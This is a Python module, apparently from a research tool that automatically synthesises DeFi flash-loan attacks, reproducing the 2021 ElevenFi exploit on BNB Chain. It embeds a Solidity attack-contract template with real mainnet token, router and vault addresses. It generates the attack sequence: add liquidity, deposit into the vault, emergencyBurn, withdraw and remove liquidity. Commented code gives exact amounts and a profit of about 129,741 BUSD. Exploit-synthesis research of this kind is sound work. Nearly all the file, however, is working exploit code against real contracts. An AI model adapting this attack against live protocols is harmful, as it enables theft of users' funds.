import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class ElevenFiAction:

    initialStates = [65075924, 13814771]
    globalStates = initialStates.copy() 
    # MetaSwapDepositSummary.
    # BUSD.balanceOf(SwapAddress); nrvFUSDT.totalSupply()

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/ElevenFiI.sol";
//Timestamp  	2021-06-23 02:11:22(UTC)
//Block number 	8534790
//Gas limit  	10000000
//Gas used  2036900
// tx: 0x16c87d9c4eb3bc6c4e5fbba789f72e8bbfc81b3403089294a81f31b91088fc2f


contract ElevenFi_attack {
    address private EOA;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private PancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private MetaSwapDepositAddress = 0xC924A8a789d7FafD089cc285e2546FC851b0942c;
    address private nrvFUSDTAddress = 0x2e91A0CECf28c5E518bB2E7fdcd9F8e2cd511c10;
    address private ElevenNeverSellVaultAddress = 0x030970f2378748Eca951ca5b2f063C45225c8f6c;
    address private SwapAddress = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;  // where BSDU comes from and goes to
    address private ThreeNRVLPAddress = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14; 


    IWBNB WBNB = IWBNB(payable(WBNBAddress));
    IBEP20 BUSD = IBEP20(BUSDAddress);
    IBEP20 nrvFUSDT = IBEP20(nrvFUSDTAddress);
    IBEP20 ThreeNRVLP = IBEP20(ThreeNRVLPAddress);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(PancakeRouterAddress));
    IMetaSwapDeposit MetaSwapDeposit = IMetaSwapDeposit(MetaSwapDepositAddress);
    IElevenNeverSellVault ElevenNeverSellVault = IElevenNeverSellVault(ElevenNeverSellVaultAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    uint[] amounts = new uint[](4);


    constructor() payable {
        WBNB.approve(PancakeRouterAddress, 2**256 - 1);
        BUSD.approve(PancakeRouterAddress, 2 ** 256 - 1);
        BUSD.approve(MetaSwapDepositAddress, 2 ** 256 - 1);
        nrvFUSDT.approve(ElevenNeverSellVaultAddress, 2 ** 256 - 1);
        nrvFUSDT.approve(MetaSwapDepositAddress, 2 ** 256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}

    '''

    startStr_attack = '''
    // flashloan amount: 130,001  000,000,000,000,000,000 BUSD
    function attack( $$_$$ ) public {
    '''

    endStr_attack = '''
        revert(ProfitSummary());
    }
    
    '''

    endStr_contract = '''
          function MetaSwapDepositSummary() internal returns (string memory _uintAsString2) {
              uint balance = BUSD.balanceOf(SwapAddress) / 1e18;
              uint balance2 = nrvFUSDT.totalSupply() / 1e18;
              return appendWithSpace(appendWithSpace("BUSD balance: ", uint2str(balance)), appendWithSpace("nrvFUSDT total supply: ", uint2str(balance2)));
          }
        
          function ProfitSummary() internal returns (string memory _uintAsString)  {
              str1 = uint2str( BUSD.balanceOf(address(this)) / 1e18);
              return append("BUSD balance: ", str1);
          }


          function uint2str(uint _i) internal returns (string memory _uintAsString) {
              if (_i == 0) {
                  return "0";
              }
              uint j = _i;
              uint len;
              while (j != 0) {
                  len++;
                  j /= 10;
              }
              bytes memory bstr = new bytes(len);
              uint k = len - 1;
              while (_i != 0) {
                  bstr[k--] = byte(uint8(48 + _i % 10));
                  _i /= 10;
              }
              return string(bstr);
          }

          function append(string memory a, string memory b) internal pure returns (string memory) {
              return string(abi.encodePacked(a, b));
          }

          function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
              return append(a, append(" ", b));
          }


          function toString(address account) internal pure returns(string memory) {
              return toString(abi.encodePacked(account));
          }

          function toString(bytes memory data) internal pure returns(string memory) {
              bytes memory alphabet = "0123456789abcdef";

              bytes memory str = new bytes(2 + data.length * 2);
              str[0] = "0";
              str[1] = "x";
              for (uint i = 0; i < data.length; i++) {
                  str[2+i*2] = alphabet[uint(uint8(data[i] >> 4))];
                  str[3+i*2] = alphabet[uint(uint8(data[i] & 0x0f))];
              }
              return string(str);
          }



      }

    
    '''

    initialBalances = {"BUSD": 130001}
    globalStates = {"BUSD": 130001}
    TargetTokens = {'BUSD'}
    TokenPrices = {"BUSD": 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1:
            return 0
        profit = stats[0] - 130001
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)


    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = AddLiquidity
        action2 = Deposit
        action3 = EmergencyBurn
        action4 = Withdraw
        action5 = RemoveLiquidity
        action_list_1 = [action1, action2, action4, action5]

        action1_prestate_dependency = [
            action1, action2, action3, action4, action5]
        # action2_prestate_dependency = [
        #     action1, action2, action3, action4, action5]
        # action4_prestate_dependency = [
        #     action1, action2, action3, action4, action5]
        action5_prestate_dependency = [
            action1, action2, action3, action4, action5]

        ActionWrapper = ElevenFiAction

        action_lists = [action1_prestate_dependency + [action1], \
            action5_prestate_dependency + [action5]]

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return


class AddLiquidity(ElevenFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['BUSD']
    tokensOut = ['nrvFUSDT']
    range = [0, 140000]  # 130001

    @classmethod
    def actionStr(cls):
        action = "      // Action: AddLiquidity\n"
        action += '''               amounts[0] = 0;
        amounts[1] = $$ * 10 ** 18;
        amounts[2] = 0;
        amounts[3] = 0;
        MetaSwapDeposit.addLiquidity(amounts, 0, 2 ** 256 - 1);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: AddLiquidity\n"
        action += "        str3 = MetaSwapDepositSummary();\n"
        action += "        uint nrvFUSDTgot = nrvFUSDT.balanceOf(address(this));\n"
        action += '''               amounts[0] = 0;
        amounts[1] = $$ * 10 ** 18;
        amounts[2] = 0;
        amounts[3] = 0;
        MetaSwapDeposit.addLiquidity(amounts, 0, 2 ** 256 - 1);\n'''
        action += "        nrvFUSDTgot = nrvFUSDT.balanceOf(address(this)) - nrvFUSDTgot;\n"
        action += "        str4 = MetaSwapDepositSummary();\n"
        action += "        revert(appendWithSpace(append(str3, str4), uint2str(nrvFUSDTgot / 1e18)));\n"
        return action



    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1
        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)
        cls.values[0].append(values[2])
        cls.values[1].append(values[3])
        cls.values[2].append(values[4])
        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0],
                  cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["BUSD"] -= input
        output0, output1, output2 = cls.simulate(input)
        if "nrvFUSDT" not in cls.currentBalances:
            cls.currentBalances["nrvFUSDT"] = 0
        cls.currentBalances["nrvFUSDT"] += output2
        cls.globalStates[0] = output0
        cls.globalStates[1] = output1


    @classmethod
    def string(cls):
        return cls.__name__



class Deposit(ElevenFiAction):

    numInputs = 1
    tokensIn = ['nrvFUSDT']
    tokensOut = ['11nrvFUSDT']
    range = [0, 140000]  # 130947

    @classmethod
    def actionStr(cls):
        action = "      // Action: Deposit\n"
        action += '''        ElevenNeverSellVault.deposit( $$ * 10 ** 18 );\n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances["nrvFUSDT"] -= input
        if "11nrvFUSDT" not in cls.currentBalances:
            cls.currentBalances["11nrvFUSDT"] = 0
        cls.currentBalances["11nrvFUSDT"] += input  # output0


    @classmethod
    def string(cls):
        return cls.__name__

class EmergencyBurn(ElevenFiAction):  # don't need collect data
    numInputs = 0
    tokensIn = ['11nrvFUSDT']
    tokensOut = ['nrvFUSDT']
    range = []

    @classmethod
    def actionStr(cls):
        action = "      // Action: EmergencyBurn\n"
        action += '''        ElevenNeverSellVault.emergencyBurn();\n'''
        return action

    @classmethod
    def transit(cls):  # Assume input is a value
        cls.currentBalances["nrvFUSDT"] += cls.currentBalances["11nrvFUSDT"]
        return

    @classmethod
    def string(cls):
        return cls.__name__


class Withdraw(ElevenFiAction):
    numInputs = 1
    tokensIn = ['11nrvFUSDT']
    tokensOut = ['nrvFUSDT']
    range = [0, 140000]  # 130947

    @classmethod
    def actionStr(cls):
        action = "      // Action: Withdraw\n"
        action += "      ElevenNeverSellVault.withdraw($$ * 10 ** 18);\n"
        return action

    @classmethod
    def transit(cls, input):  # Assume input is a value

        cls.currentBalances["11nrvFUSDT"] -= input
        cls.currentBalances["nrvFUSDT"] += input  # output0
        return

    @classmethod
    def string(cls):
        return cls.__name__



class RemoveLiquidity(ElevenFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['nrvFUSDT']
    tokensOut = ['BUSD']
    range = [0, 280000]  # 261894

    @classmethod
    def actionStr(cls):
        action = "      // Action: RemoveLiquidity\n"
        action += "      MetaSwapDeposit.removeLiquidityOneToken($$ * 10 ** 18, 1, 0, 2 ** 256 - 1); \n"
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: RemoveLiquidity\n"
        action += '''        str3 = MetaSwapDepositSummary();\n'''
        action += '''        uint BUSDgot = BUSD.balanceOf(address(this));\n'''
        action += '''        MetaSwapDeposit.removeLiquidityOneToken($$ * 10 ** 18, 1, 0, 2 ** 256 - 1); \n'''
        action += '''        BUSDgot = BUSD.balanceOf(address(this)) - BUSDgot;\n'''
        action += '''        str4 = MetaSwapDepositSummary();\n'''
        action += '''        revert(appendWithSpace(append(str3, str4), uint2str(BUSDgot / 1e18)));\n '''
        return action



    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1
        point = [values[0], values[1], inputs[-1]]

        if point in cls.points:
            return -2

        cls.points.append(point)
        cls.values[0].append(values[2])
        cls.values[1].append(values[3])
        cls.values[2].append(values[4])

        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0],
                  cls.globalStates[1], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        output0, output1, output2 = cls.simulate(input)
        cls.currentBalances["nrvFUSDT"] -= input
        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["BUSD"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__


def main():
    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.contract_name = "ElevenFi_attack"
    config.initialEther = 500
    config.blockNum = 8534790
    config.ETHorBSCorDVDorFantom = 1

# Test for initial pass of data collecton:
    ElevenFiAction.initialPass()

# #     ElevenFiAction.runinitialPass()

# # # Test for correct sequence of actions and correct sequence of parameters
#     initial_guess = [130001, 130947, 130947, 261894]

#     action1 = AddLiquidity
#     action2 = Deposit
#     action3 = EmergencyBurn
#     action4 = Withdraw
#     action5 = RemoveLiquidity

#     action_list = [action1, action2, action3, action4, action5]
#     ActionWrapper = ElevenFiAction


#     print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))
    
# #     actual_profit = 129741.57
# #     print("actual profit: ", actual_profit)
# #     e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
# #     return actual_profit, e1, e2, e3, e4


if __name__ == "__main__":
    main()
    